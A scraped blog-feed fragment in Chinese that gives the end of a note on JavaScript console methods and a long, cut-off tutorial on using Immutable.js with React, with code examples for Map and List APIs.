//在console窗口输出信息，同时，会在输出信息的前面，加上一个蓝色图标。console.debug() //在console窗口输出信息，同时，会在输出信息的前面，加上一个蓝色图标。console.warn() //输出信息时，在最前面加一个黄色三角，表示警告；console.error() //输出信息时，在最前面加一个红色的叉，表示出错，同时会显示错误发生的堆栈console.table() //可以将复合类型的数据转为表格显示。console.count() //用于计数，输出它被调用了多少次。console.dir() //用来对一个对象进行检查（inspect），并以易于阅读和打印的格式显示。console.dirxml() //用于以目录树的形式，显示DOM节点。console.assert() //接受两个参数，第一个参数是表达式，第二个参数是字符串。只有当第一个参数为false，才会输出第二个参数，否则不会有任何结果。//这两个方法用于计时，可以算出一个操作所花费的准确时间。console.time()console.timeEnd()//time方法表示计时开始，timeEnd方法表示计时结束。它们的参数是计时器的名称。调用timeEnd方法之后，console窗口会显示“计时器名称: 所耗费的时间”。console.profile() //用来新建一个性能测试器（profile），它的参数是性能测试器的名字。console.profileEnd() //用来结束正在运行的性能测试器。console.group()console.groupend()//上面这两个方法用于将显示的信息分组。它只在输出大量信息时有用，分在一组的信息，可以用鼠标折叠/展开。console.groupCollapsed() //用于将显示的信息分组，该组的内容，在第一次显示时是收起的（collapsed），而不是展开的。console.trace() //显示当前执行的代码在堆栈中的调用路径。console.clear() //用于清除当前控制台的所有输出，将光标回置到第一行。","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"API","slug":"API","permalink":"https://ru23.com/tags/API/"}]},{"title":"React之Immutable学习记录（十二）","slug":"2017-11-react-study-Immutable","date":"2017-11-20T12:10:24.000Z","updated":"2018-10-24T03:46:02.262Z","comments":true,"path":"note/2a0f702d.html","link":"","permalink":"https://ru23.com/note/2a0f702d.html","excerpt":"","text":"整理于互联网 一、前言 从问题说起：熟悉 React 组件生命周期的话都知道：调用 setState 方法总是会触发 render 方法从而进行 vdom re-render 相关逻辑，哪怕实际上你没有更改到 Component.state 12this.state = &#123;count: 0&#125;this.setState(&#123;count: 0&#125;);// 组件 state 并未被改变，但仍会触发 render 方法 为了避免这种性能上的浪费，React 提供了一个 shouldComponentUpdate 来控制触发 vdom re-render 逻辑的条件。于是 PureRenderMixin 作为一种优化技巧被使用。它仅仅是浅比较对象，深层次的数据结构根本不管用 js中的Immutable Data 在javascript中我们可以通过deep clone来模拟Immutable Data，就是每次对数据进行操作，新对数据进行deep clone出一个新数据 deep clone 当然你或许意识到了，这样非常的慢 1234567891011121314151617181920212223'use strict'; var cloneDeep = require('lodash.clonedeep');var data = &#123; id: 'data', author: &#123; name: 'mdemo', github: 'https://github.com/demohi' &#125;&#125;;var data1 = cloneDeep(data);console.log('equal:', data1===data); //falsedata1.id = 'data1'; data1.author.name = 'demohi';console.log(data.id);// data console.log(data1.id);// data1console.log(data.author.name);//mdemo console.log(data1.author.name);//demohi 这时候 immutableJS 就派得上用场了 123var map1 = Immutable.fromJS(&#123;a:1, b:1, c:&#123;b:&#123;c:&#123;d:&#123;e:7&#125;&#125;&#125;&#125;&#125;);var map2 = Immutable.fromJS(&#123;a:1, b:1, c:&#123;b:&#123;c:&#123;d:&#123;e:7&#125;&#125;&#125;&#125;&#125;);Immutable.is(map1, map2); // true 遍历对象不再用for-in，可以这样: 1Immutable.fromJS(&#123;a:1, b:2, c:3&#125;).map(function(value, key) &#123; /* do some thing */&#125;); 二、什么是 Immutable Data Immutable Data 就是一旦创建，就不能再被更改的数据。对 Immutable 对象的任何修改或添加删除操作都会返回一个新的 Immutable 对象 Immutable 实现的原理是 Persistent Data Structure（持久化数据结构），也就是使用旧数据创建新数据时，要保证旧数据同时可用且不变 同时为了避免 deepCopy 把所有节点都复制一遍带来的性能损耗，Immutable 使用了 Structural Sharing····（结构共享），即如果对象树中一个节点发生变化，只修改这个节点和受它影响的父节点，其它节点则进行共享。 打印immutableJS看看有什么东西 image.png 一个说明不可变的例子 12345678910111213141516171819202122232425262728293031// 原生对象let a1 = &#123; b: 1, c: &#123; c1: 123 &#125;&#125;;let b1 = a1;b1.b = 2;console.log(a1.b, b1.b); // 2, 2console.log(a1 === b1); // trueconsole.log(a1.c === b1.c); // true// immutable.js 的Maplet a2 = Immutable.fromJS(&#123; b: 1, c: &#123; c1: 123 &#125;&#125;);let b2 = a2.set('b', 2);// 对 Immutable 对象的任何修改或添加删除操作都会返回一个新的 Immutable 对象console.log(a2.get('b'), b2.get('b')); // 1, 2 对象 a2 的 b 值并没有变成2。console.log(a2 === b2); // false//如果对象树中一个节点发生变化，只修改这个节点和受它影响的父节点，其它节点则进行共享。console.log(a2.get('c') === b2.get('c')); //true 三、为什么要在React.js中使用Immutable 它是一个完全独立的库，无论基于什么框架都可以用它。意义在于它弥补了Javascript 没有不可变数据结构的问题 由于是不可变的，可以放心的对对象进行任意操作。在React开发中，频繁操作state对象或是store，配合immutableJS快、安全、方便 熟悉React.js的都应该知道，React.js是一个UI = f(states)的框架，为了解决更新的问题，React.js使用了virtual dom，virtual dom通过diff修改dom，来实现高效的dom更新。 但是有一个问题。当state更新时，如果数据没变，你也会去做virtual dom的diff，这就产生了浪费。这种情况其实很常见 当然你可能会说，你可以使用PureRenderMixin来解决呀，PureRenderMixin是个好东西，我们可以用它来解决一部分的上述问题 但PureRenderMixin只是简单的浅比较，不使用于多层比较。那怎么办？自己去做复杂比较的话，性能又会非常差 方案就是使用immutable.js可以解决这个问题。因为每一次state更新只要有数据改变，那么PureRenderMixin可以立刻判断出数据改变，可以大大提升性能 Immutable 优点 Immutable 降低了 Mutable 带来的复杂度 可变（Mutable）数据耦合了 Time和 Value 的概念，造成了数据很难被回溯 节省内存 Immutable.js 使用了 Structure Sharing 会尽量复用内存，甚至以前使用的对象也可以再次被复用。没有被引用的对象会被垃圾回收 123456789import &#123; Map&#125; from 'immutable';let a = Map(&#123; select: 'users', filter: Map(&#123; name: 'Cam' &#125;)&#125;)let b = a.set('select', 'people');a === b; // falsea.get('filter') === b.get('filter'); // true Undo/Redo，Copy/Paste，甚至时间旅行这些功能做起来小菜一碟 因为每次数据都是不一样的，只要把这些数据放到一个数组里储存起来，想回退到哪里就拿出对应数据即可，很容易开发出撤销重做这种功能。 并发安全 传统的并发非常难做，因为要处理各种数据不一致问题，因此『聪明人』发明了各种锁来解决。但使用了 Immutable 之后，数据天生是不可变的，并发锁就不需要了。 拥抱函数式编程 Immutable 本身就是函数式编程中的概念，纯函数式编程比面向对象更适用于前端开发。因为只要输入一致，输出必然一致，这样开发的组件更易于调试和组装。 Immutable 缺点 需要学习新的 API 增加了资源文件大小 容易与原生对象混淆 四、Immutable 的几种数据类型 List: 有序索引集，类似JavaScript中的Array。 Map: 无序索引集，类似JavaScript中的Object。 OrderedMap: 有序的Map，根据数据的set()进行排序。 Set: 没有重复值的集合。 OrderedSet: 有序的Set，根据数据的add进行排序。 Stack: 有序集合，支持使用unshift（）和shift（）添加和删除。 Range(): 返回一个Seq.Indexed类型的集合，这个方法有三个参数，start表示开始值，默认值为0，end表示结束值，默认为无穷大，step代表每次增大的数值，默认为1.如果start = end,则返回空集合。 Repeat(): 返回一个vSeq.Indexe类型的集合，这个方法有两个参数，value代表需要重复的值，times代表要重复的次数，默认为无穷大。 Record: 一个用于生成Record实例的类。类似于JavaScript的Object，但是只接收特定字符串为key，具有默认值。 Seq: 序列，但是可能不能由具体的数据结构支持。 Collection: 是构建所有数据结构的基类，不可以直接构建 上面那么多常用的也就是 List和Map 五、几个重要的API1、fromJS() fromJS() 是最最最常用的将原生JS数据转换为ImmutableJS数据的转换方法。使用方式类似于 JSON.parse()，接收两个参数：json 数据和 reviver函数 在不传递reviver函数的情况下，默认将原生JS的Array转为List，Object转为Map 1234567891011121314// 常见const t1 = Immutable.fromJS(&#123;a: &#123;b: [10, 20, 30]&#125;, c: 40&#125;);console.log(t1);// 不常用const t2 = Immutable.fromJS(&#123;a: &#123;b: [10, 20, 30]&#125;, c: 40&#125;, function(key, value) &#123; // 定制转换方式，下这种就是将Array转换为List，Object转换为Map const isIndexed = Immutable.Iterable.isIndexed(value); return isIndexed ? value.toList() : value.toOrderedMap(); // true, \"b\", &#123;b: [10, 20, 30]&#125; // false, \"a\", &#123;a: &#123;b: [10, 20, 30]&#125;, c: 40&#125; // false, \"\", &#123;\"\": &#123;a: &#123;b: [10, 20, 30]&#125;, c: 40&#125;&#125;&#125;);console.log(t2); 2、is() 先来看官网的一段话: immutable数据应该被当作值而不是对象，值是表示该事件在特定时刻的状态。这个原则对理解不可变数据的适当使用是最重要的。为了将Immutable.js数据视为值，就必须使用Immutable.is()函数或.equals()方法来确定值相等，而不是确定对象引用标识的 === 操作符 所以is()就是用来对两个immutable对象进行值比较的。使用方式类似于 Object.is(obj1, obj2)，接收两个参数 12345678910111213141516const map1 = Immutable.Map(&#123;a:1, b:1, c:1&#125;);const map2 = Immutable.Map(&#123;a:1, b:1, c:1&#125;);// 两个不同的对象console.log(map1 === map2); // false// 进行值比较console.log(Immutable.is(map1, map2)); // true// 不仅仅只能比较ImmutableJS的类型的数据console.log(Immutable.is(undefined, undefined)); // trueconsole.log(Immutable.is(null, undefined)); // falseconsole.log(Immutable.is(null, null)); // trueconsole.log(Immutable.is(NaN, NaN)); // true// 区别于 Object.isconsole.log(Object.is(0, -0) ,Immutable.is(-0, 0)); // false , true 3、Map Map 数据类型，对应原生 Object 数组。最最常用的 数据结构之一，循环时无序(orderedMap有序)，对象的 key 可以是任意值。具体看下面的例子 1234console.log(Map().set(List.of(1), 'list-of-one').get(List.of(1)));console.log(Map().set(NaN, 'NaN').get(NaN));console.log(Map().set(undefined, 'undefined').get(undefined));console.log(Map().set(null, 'null').get(null)); 简单介绍 OrderedMap OrderedMap 是 Map 的变体，它除了具有 Map 的特性外，还具有顺序性，当开发者遍历 OrderedMap 的实例时，遍历顺序为该实例中元素的声明、添加顺序。OrderedMap比非有序Map更昂贵，并且可能消耗更多的内存。如果真要求遍历有序，请使用List 4、List List 数据类型，对应原生 Array数组。和原生数组，最大区别不存在’空位’。[, , , , ] 1console.log(List([,,,,]).toJS());// [undefined, undefined, undefined, undefined] 六、API 我们主要介绍Map和 List 创建1、通过构造函数 Map() 构造函数不常用，一般都是通过Immutable.fromJS()将一个JS原生对象转换为一个Immutable对象 2、Map() 123456789101112/* Map&lt;K, V&gt;(): Map&lt;K, V&gt; Map&lt;K, V&gt;(iter: Iterable.Keyed&lt;K, V&gt;): Map&lt;K, V&gt; Map&lt;K, V&gt;(iter: Iterable&lt;any, Array&lt;any&gt;&gt;): Map&lt;K, V&gt; Map&lt;K, V&gt;(obj: Array&lt;Array&lt;any&gt;&gt;): Map&lt;K, V&gt; Map&lt;V&gt;(obj: &#123;[key: string]: V&#125;): Map&lt;string, V&gt; Map&lt;K, V&gt;(iterator: Iterator&lt;Array&lt;any&gt;&gt;): Map&lt;K, V&gt; Map&lt;K, V&gt;(iterable: Object): Map&lt;K, V&gt; */console.log(Map().toJS()); // &#123;&#125;console.log(Map(&#123;key: \"value\"&#125;).toJS()); // &#123;key: \"value\"&#125; 同Key覆盖问题 12//最后的&#123;key: value2&#125; 覆盖了前面的 &#123;key: value&#125;console.log(Map([[\"key\", \"value\"], [\"key\", \"value2\"], [\"key1\", \"value1\"]]).toJS());// &#123;key: \"value2\", key1: \"value1\"&#125; 3、List() 123456789101112/* List&lt;T&gt;(): List&lt;T&gt; List&lt;T&gt;(iter: Iterable.Indexed&lt;T&gt;): List&lt;T&gt; List&lt;T&gt;(iter: Iterable.Set&lt;T&gt;): List&lt;T&gt; List&lt;K, V&gt;(iter: Iterable.Keyed&lt;K, V&gt;): List&lt;any&gt; List&lt;T&gt;(array: Array&lt;T&gt;): List&lt;T&gt; List&lt;T&gt;(iterator: Iterator&lt;T&gt;): List&lt;T&gt; List&lt;T&gt;(iterable: Object): List&lt;T&gt; */console.log(List().toJS()); // []console.log(List([1,2,3,4,&#123;a:123&#125;]).toJS()); // [ 1, 2, 3, 4, &#123;a: 123&#125;] 4、另一种方式 Map.of() 1console.log(Map.of('key1','value1','key2','value2','key3','value3').toJS()); // &#123;key1: \"value1\", key2: \"value2\", key3: \"value3\"&#125; List.of() 1console.log(List.of(&#123;x:1&#125;, 2, [3], 4).toJS()); // [&#123;x:1&#125;, 2, [3], 4] 判断是否是一个Map或者List1、Map判断 判断是否是一个Map , 对原生Object不生效 12console.log(Map.isMap(&#123;&#125;)); // falseconsole.log(Map.isMap(Map(&#123;&#125;))); // true 2、List判断 判断是否是一个List , 对原生Array不生效 12console.log(List.isList([])); // falseconsole.log(List.isList(List([]))); // true 获取大小1、size 1234567// listconsole.log(List([1,2,3,4]).size);// 4console.log(List.of(1, 2, 3, 4).size);// 4// mapconsole.log(Map(&#123;key: \"value2\", key1: \"value1\"&#125;).size);// 2console.log(Map.of(&#123;x:1&#125;, 2, [3], 4).size);// 2 count() 12345678910111213// mapconsole.log(Immutable.fromJS(&#123;key: \"value2\", key1: \"value1\"&#125;).count());// 4// 可以定制条件，来确定大小console.log(Immutable.fromJS(&#123;key: 1, key1: 34&#125;).count((value, key, obj) =&gt; &#123; return value &gt; 3;&#125;));// 1 value大于3的有两个// listconsole.log(Immutable.fromJS([1, 2, 5, 6]).count());// 4// 可以制定条件，来确定 大小console.log(Immutable.fromJS([1, 2, 5, 6]).count((value, index, array) =&gt; &#123; return value &gt; 3;&#125;));// 2 大于3的有两个 countBy() countBy()和count()的区别就是它的返回值是一个对象。 123456789// Mapconsole.log(Immutable.fromJS(&#123;key: 1, key1: 34&#125;).countBy((value, key, obj) =&gt; &#123; return value &gt; 3;&#125;).toJS());// &#123;false: 1, true: 1&#125;// listconsole.log(Immutable.fromJS([1, 2, 5, 6]).countBy((value, index, array) =&gt; &#123; return value &gt; 3;&#125;).toJS());// &#123;false: 2, true: 2&#125; 添加元素1、Set 1234567891011// Map// 将 key 位置的元素替换为 valueconst $obj1 = Map(&#123;a: &#123;a1: 34&#125;, b: 2, c: 3, d: 444&#125;);console.log($obj1.set('a', 0).toJS()); // &#123;a: 0, b: 2, c: 3, d: 444&#125;console.log($obj1.set('e', 99).toJS()); // &#123;a: 1, b: 2, c: 3, d: 444, e: 99&#125;// List// 将 index 位置的元素替换为 value，即使索引越界也是安全的, 空位 undefinedconst $arr1 = List([1, 2, 3]);console.log($arr1.set(-1, 0).toJS()); // [1, 2, 0] 注意-1 等效于 $arr1.set($arr1.size + -1, 0)console.log($arr1.set(4, 0).toJS()); // [ 1, 2, 3, undefined, 0 ] 空位置为了undefined 2、setIn 12345// Mapconsole.log(Immutable.fromJS([1, 2, 3, &#123;a: 45, b: 64&#125;]).setIn(['3', 'a'], 1000).toJS());//[1, 2, 3, &#123;a: 1000, b: 64&#125;]// Listconsole.log(Immutable.fromJS([1, 2, 3, &#123;a: 45, b: 64&#125;]).setIn(['3', 'a'], 1000).toJS());//[1, 2, 3, &#123;a: 1000, b: 64&#125;] List 特有的添加元素1、插入元素 123// insert(index: number, value: T)// 向 index 位置插入 valueconsole.log(Immutable.fromJS([1, 2, 3]).insert(1, 1.5).toJS()); // [ 1, 1.5, 2, 3 ] 2、设置size 默认值undefined 1console.log(List([]).setSize(2).toJS()); // [undefined, undefined] 3、pop、push、shift、unshift List数据类型也拥有pop、push、shift、unshift这四种操作方法，和原生Array的四种方法使用方式一致，但唯一区别就是返回新的List，并且不改变原来的数组本身，而原生则是会改变元素本身 123456// ImmutableJS：返回新的List，并且不改变元素本身const $test = List([1, 2, 3, 4]);console.log($test.pop().toJS(), $test.toJS()); // [1, 2, 3] [1, 2, 3, 4]// 原生：返回被改变的值，改变元素本身const test = [1, 2, 3, 4];console.log(test.pop(), test); // 4 [1, 2, 3] 4、花样插入 1234567891011121314151617// interpose// 插入xxx之间console.log(Immutable.fromJS([1, 2, 5, 6]).interpose(5555).toJS()); // [1, 5555, 2, 5555, 5, 5555, 6]// interleave// 被操作的两个数组，每个的第一项、第二项、第三项... 组成新的数组。console.log(Immutable.fromJS([1, 2, 5, 6]).interleave(Immutable.fromJS([555, 666])).toJS()); // [1, 555, 2, 666]// zip// 被操作的两个数组，抽离第一项和第二项组成新的子数组，放入到一个大数组中，形成二维数组。console.log(Immutable.fromJS([1, 2, 5, 6]).zip(Immutable.fromJS([555, 666]).toJS())); // [ [1, 555], [2, 666]]// 自定义插入规则。// zipWithconsole.log(Immutable.fromJS([1, 2, 5, 6]).zipWith((a, b) =&gt; &#123; return a + b;&#125;, Immutable.fromJS([555, 666]).toJS())); // [ 556, 668] 删除元素1、delete(key) 123456789// List// delete(index: number)// 删除 index 位置的元素console.log(Immutable.fromJS([1, 2, 3]).delete(1).toJS(), $arr1.toJS());// [ 1, 3 ] [ 1, 2, 3]console.log(Immutable.fromJS([1, 2, 3]).delete(77).toJS(), $arr1.toJS(), '超过范围不会强制报错');// [ 1, 2, 3] [ 1, 2, 3] 超过范围不会强制报错// Mapconsole.log(Immutable.fromJS(&#123;a: &#123;a1: 34&#125;, b: 2, c: 3, d: 444&#125;).delete('c').toJS(), $obj1.toJS());// &#123;a: 1, b: 2, d: 444&#125; &#123;a: 1, b: 2, c: 3, d: 444&#125;console.log(Immutable.fromJS(&#123;a: &#123;a1: 34&#125;, b: 2, c: 3, d: 444&#125;).delete('asdfasfd').toJS(), $obj1.toJS());// &#123;a: 1, b: 2, c: 3, d: 444&#125; &#123;a: 1, b: 2, c: 3, d: 444&#125; 2、deleteIn 和 setIn使用方式一致 3、清空元素 lear() 12345// Listconsole.log(Immutable.fromJS([1, 2, 3]).clear().toJS());// []// Mapconsole.log(Immutable.fromJS(&#123;a: &#123;a1: 34&#125;, b: 2, c: 3, d: 444&#125;).clear().toJS());// &#123;&#125; 修改元素 修改某一个元素 1、set setIn 上面已经介绍过 2、update update(key: K, notSetValue: V, updater: (value: V) =&gt; V): Map&lt;K, V&gt; 123456789101112131415161718192021222324252627// Listconst $arr1 = Immutable.fromJS([1, 2, 3]);console.log($arr1.update('2', (value)=&gt; &#123; return value * 2;&#125;).toJS(), $arr1.toJS());// [1, 2, 6] [1, 2, 3]console.log($arr1.update('6', 1, (value)=&gt; &#123; return value * 2;&#125;).toJS(), $arr1.toJS());// [1, 2, 3, undefined, undefined, undefined, 2] [1, 2, 3]console.log($arr1.update('6', 0, (value)=&gt; &#123; // 默认值必须大于0 感觉有BUG，所以还是不要用了。 return value * 2;&#125;).toJS(), $arr1.toJS());// [1, 2, 3] [1, 2, 3]// Mapconst $obj1 = Immutable.fromJS(&#123;a: &#123;a1: 34&#125;, b: 2, c: 3, d: 444&#125;);console.log($obj1.update('a', (value)=&gt; &#123; return value * 2;&#125;).toJS(), $obj1.toJS());// &#123;a: 2, b: 2, c: 3, d: 444&#125; &#123;a: 1, b: 2, c: 3, d: 444&#125;console.log($obj1.update('e', 1, (value)=&gt; &#123; return value * 2;&#125;).toJS(), $obj1.toJS());// &#123;a: 1, b: 2, c: 3, d: 444, e: 2&#125; &#123;a: 1, b: 2, c: 3, d: 444&#125;console.log($obj1.update('e', 0, (value)=&gt; &#123; // 默认值入手是number必须大于0 感觉有BUG，所以还是不要用了。 return value * 2;&#125;).toJS(), $obj1.toJS());// &#123;a: 1, b: 2, c: 6, d: 444&#125; &#123;a: 1, b: 2, c: 3, d: 444&#125; 3、updateIn 使用方式和setIn一样。 获取某个元素值1、get getIn 使用方式：get(key: number, notSetValue?: T) 123456789101112131415161718192021222324// Listconst $test = Immutable.fromJS([1111111, 22222, &#123;a: 888123&#125;]);console.log($test.get(0)); // 1111111// 只有数组可以用 number 类型 的keyconsole.log(Immutable.fromJS(&#123;1: 'abc'&#125;).get(1), Immutable.fromJS(&#123;1: 'abc'&#125;).get('1'));// undefined \"abc\" | 只有数组可以用 number 类型 的key// notSetValue 默认值，了解console.log($test.get(11, 'no have value')); // no have value// getInconsole.log($test.getIn(['2', 'a'], 'child no have value')); // 888123console.log($test.getIn(['2', 'b'], 'child no have value')); // child no have value// Mapconst $test = Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: 2, c: 3, d: 444&#125;);console.log($test.get('a')); // 1111111// notSetValue 默认值，了解console.log($test.get('v', 'no have value')); // no have value// getInconsole.log($test.getIn(['a', 'a1'], 'child no have value')); // 222console.log($test.getIn(['d', 'b1'], 'child no have value')); // child no have value 2、获取头、尾元素 123456789// Listconst $arr1 = Immutable.fromJS([1, 2, 3]);console.log($arr1.first());// 1console.log($arr1.last());// 3// MapImmutable.fromJS(&#123;a: &#123;a1: 34&#125;, b: 2, c: 3, d: 444&#125;);console.log($obj1.first());// &#123;a1: 34&#125;console.log($obj1.last());// 444 查找某个元素1、find() findLast() find()、findLast()返回 value 123456789// Listconsole.log(Immutable.fromJS([1, 2, 56, &#123;a: &#123;b: 111&#125;&#125;]).find((value, index, array) =&gt; &#123; return index === 3;&#125;).toJS());// &#123;a: &#123;b: 111&#125;&#125;// Mapconsole.log(Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: 2, c: 3, d: 444&#125;).find((value, key, obj) =&gt; &#123; return value === 3;&#125;));// 3 2、findKey() findLastKey() findKey()、findLastKey() 返回 key 123456789// Listconsole.log(Immutable.fromJS([1, 2, 3, &#123;a: &#123;b: 111&#125;&#125;]).findKey((value, index, array) =&gt; &#123; return index === 3;&#125;));// 3// Mapconsole.log(Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: 2, c: 3, d: 444&#125;).findKey((value, key, obj) =&gt; &#123; return value === 3;&#125;));// c 3、findEntry() findLastEntry() findEntry()、findLastEntry() 返回 key:value 123456789// Listconsole.log(Immutable.fromJS([1, 2, 3, &#123;a: &#123;b: 111&#125;&#125;]).findEntry((value, index, array) =&gt; &#123; return index === 3;&#125;));// [3, Map]// Mapconsole.log(Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: 2, c: 3, d: 444&#125;).findEntry((value, key, obj) =&gt; &#123; return Immutable.is(value, Immutable.fromJS(&#123;a1: 222&#125;));&#125;));// [\"a\", Map] 4、keyOf() lastKeyOf() keyOf()、lastKeyOf() 根据 value 返回key。 1234567/ Listconsole.log(Immutable.fromJS([1, 2, 3, &#123;a: &#123;b: 111&#125;&#125;]).keyOf(Immutable.fromJS(&#123;a: &#123;b: 111&#125;&#125;))); // 3console.log(Immutable.fromJS([1, 2, 3, &#123;a: &#123;b: 111&#125;&#125;]).keyOf(2)); // 1// Mapconsole.log(Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: 2, c: 3, d: 444&#125;).keyOf(Immutable.fromJS(&#123;a1: 222&#125;))); // aconsole.log(Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: 2, c: 3, d: 444&#125;).keyOf(2)); // b List 特有查找某个元素1、indexOf() lastIndexOf() 12// 找不到 返回 -1console.log(Immutable.fromJS([1, 2, 3, &#123;a: &#123;b: 111&#125;&#125;]).indexOf(Immutable.fromJS(&#123;a: &#123;b: 111&#125;&#125;))); // 3 2、findIndex() findLastIndex() 123console.log(Immutable.fromJS([1, 2, 3, &#123;a: &#123;b: 111&#125;&#125;]).findIndex((value, index, array) =&gt; &#123; return value/3 === 1;&#125;)); // 2 查找最大、最小元素 max()、maxBy()默认比较规则为&gt;，min()、minBy()默认比较规则为&gt; 1、max() 123456789101112131415// Listconsole.log(Immutable.fromJS([1, 2, 301, 88]).max()); // 301// 自定义比较规则console.log(Immutable.fromJS([1, 2, 301, 88]).max((valueA, valueB) =&gt; &#123; return valueA &gt; valueB;&#125;)); // 301// Mapconsole.log(Immutable.fromJS(&#123;a: 8888, b: 2, c: 3, d: 444&#125;).max()); // 8888// 自定义比较规则console.log(Immutable.fromJS(&#123;a: 8888, b: 2, c: 3, d: 444&#125;).max((valueA, valueB) =&gt; &#123; return valueA &gt; valueB;&#125;)); // 8888 2、maxBy() 12345678910111213141516171819202122232425// List// 自定义比较的元素console.log(Immutable.fromJS([&#123;a: 2&#125;, &#123;a: 1&#125;, &#123;a: 2301&#125;, &#123;a: 222&#125;]).maxBy((value, index, array) =&gt; &#123; return value.get('a');&#125;).toJS());// &#123;a: 2301&#125;// 自定义比较的元素，和比较规则console.log(Immutable.fromJS([&#123;a: 2&#125;, &#123;a: 1&#125;, &#123;a: 2301&#125;, &#123;a: 222&#125;]).maxBy((value, index, array) =&gt; &#123; return value.get('a');&#125;, (valueA, valueB) =&gt; &#123; return valueA &gt; valueB;&#125;).toJS());// &#123;a: 2301&#125;// Map// 自定义比较的元素console.log(Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: &#123;a1: 11&#125;, c: &#123;a1: 33&#125;, d: &#123;a1: 54654&#125;&#125;).maxBy((value, key, obj) =&gt; &#123; return value.get('a1');&#125;).toJS());// &#123;a1: 54654&#125;// 自定义比较的元素，和比较规则console.log(Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: &#123;a1: 11&#125;, c: &#123;a1: 33&#125;, d: &#123;a1: 54654&#125;&#125;).maxBy((value, key, obj) =&gt; &#123; return value.get('a1');&#125;, (valueA, valueB) =&gt; &#123; return valueA &gt; valueB;&#125;).toJS());// &#123;a1: 54654&#125; 3、min() 同max() 4、minBy() 同maxBy() 5、keys() values() entries() 获取ES6 Iterable 迭代器 12345678910111213141516171819202122232425262728293031323334// Listconst $test = List([11, 22, 33, 44]);const keys = $test.keys();for (let i of keys) &#123; console.log(i);&#125;const values = $test.values();for (let i of values) &#123; console.log(i);&#125;const entries = $test.entries();for (let i of entries) &#123; console.log(i);&#125;// Mapconst $test = Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: 2, c: 3, d: 444&#125;);const keys = $test.keys();for (let i of keys) &#123; console.log(i); // a b c d&#125;const values = $test.values();for (let i of values) &#123; console.log(i); // &#123;a1: 222&#125; 2 3 444&#125;const entries = $test.entries();for (let i of entries) &#123; console.log(i);// [\"a\", Map] [\"b\", 2] [\"c\", 3] [\"d\", 444]&#125; 截取1、slice() 和原生Array slice()用法一致 123456// Listconsole.log(Immutable.fromJS([1, 2, 3]).slice(0).toJS());// [1, 2, 3]// Mapconsole.log(Immutable.fromJS(&#123;a: &#123;a1: 34&#125;, b: 2, c: 3, d: 444&#125;).slice(0).toJS());// &#123;a: Object, b: 2, c: 3, d: 444&#125;console.log(Immutable.fromJS(&#123;a: &#123;a1: 34&#125;, b: 2, c: 3, d: 444&#125;).slice(1).toJS());// &#123;b: 2, c: 3, d: 444&#125; 2、rest() butLast() 1234567891011/ List// rest() 返回删除第一个元素后的 Listconsole.log(Immutable.fromJS([1, &#123;a: 1&#125;, 3, 4, 5, 6]).rest().rest().toJS()); // [&#123;a: 1&#125;, 3, 4, 5, 6]// butLast() 返回删除最后一个元素后的 Listconsole.log(Immutable.fromJS([1, &#123;a: 1&#125;, 3, 4, 5, 6]).butLast().toJS()); // [1, &#123;a: 1&#125;, 3, 4, 5]// Map// rest() 返回删除第一个元素后的 Mapconsole.log(Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: 2, c: 3, d: 444&#125;).rest().rest().toJS()); // &#123;c: 3, d: 444&#125;// butLast() 返回删除最后一个元素后的 Mapconsole.log(Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: 2, c: 3, d: 444&#125;).butLast().toJS()); // &#123;a: &#123;a1: 222&#125;, b: 2, c: 3&#125; 3、skip() skipLast() skipWhile() skipUntil() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// List// skip(number)// 从头按照条件抛出number个元素，对剩余元素进行截取// 参数 数量console.log(Immutable.fromJS([1, &#123;a: 1&#125;, 3, 4, 5, 6]).skip(2).toJS()); // [3, 4, 5, 6]// skipLast(number)// 从尾部按照条件抛出number个元素，对剩余元素进行截取// 参数 数量console.log(Immutable.fromJS([1, &#123;a: 1&#125;, 3, 4, 5, 6]).skipLast(2).toJS()); // [1, &#123;a: 1&#125;, 3, 4]// skipWhile()// 从头开始循环，抛出满足 return 条件===true 的元素。console.log(Immutable.fromJS([111, 33 , 22, 44, 55, 66]).skipWhile((value, index, array) =&gt; &#123; return value &gt; 31;&#125;).toJS()); // [22, 44, 55, 66]// skipUntil()// 从头开始循环，抛出满足 return 条件===false 的元素。console.log(Immutable.fromJS([32, 33 , 40, 44, 55, 66]).skipWhile((value, index, array) =&gt; &#123; return value &lt; 39;// 抛出直到小于39的元素。&#125;).toJS()); // [40, 44, 55, 66]// Map// skip(number)// 从头开始循环，抛出满足 return 条件===true 的元素。// 参数 数量console.log(Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: 2, c: 3, d: 444&#125;).skip(2).toJS()); // &#123;c: 3, d: 444&#125;// skipLast(number)// 从尾部按照条件抛出number个元素，对剩余元素进行截取// 参数 数量console.log(Immutable.fromJS(&#123;a: &#123;a1: 222&#125;, b: 2, c: 3, d: 444&#125;).skipLast(2).toJS()); // &#123;a: &#123;a1: 222&#125;, b: 2&#125;// skipWhile()// 从头开始循环，抛出满足 return 条件===true 的元素。console.log(Immutable.fromJS(&#123;a: 1, b: 2, c: 3, d: 444&#125;).skipWhile((value, key, obj) =&gt; &#123; return value === 1;&#125;).toJS()); // &#123;b: 2, c: 3, d: 444&#125;// skipUntil()// 从头开始循环，抛出满足 return 条件===false 的元素。console.log(Immutable.fromJS(&#123;a: 5, b: 2, c: 3, d: 444&#125;).skipWhile((value, key, obj) =&gt; &#123; return value &lt; 39;// 抛出直到小于39的元素。&#125;).toJS()); // &#123;d: 444&#125; 4、take() takeLast() takeWhile() takeUntil() 123456789101112131415161718192021222324252627282930313233343536373839404142434445// List// take(number)// 从头获取几个复合条件的元素// 参数 数量console.log(Immutable.fromJS([1, &#123;a: 1&#125;, 3, 4, 5, 6]).take(2).toJS()); // [1, &#123;a: 1&#125;]// takeLast(number)// 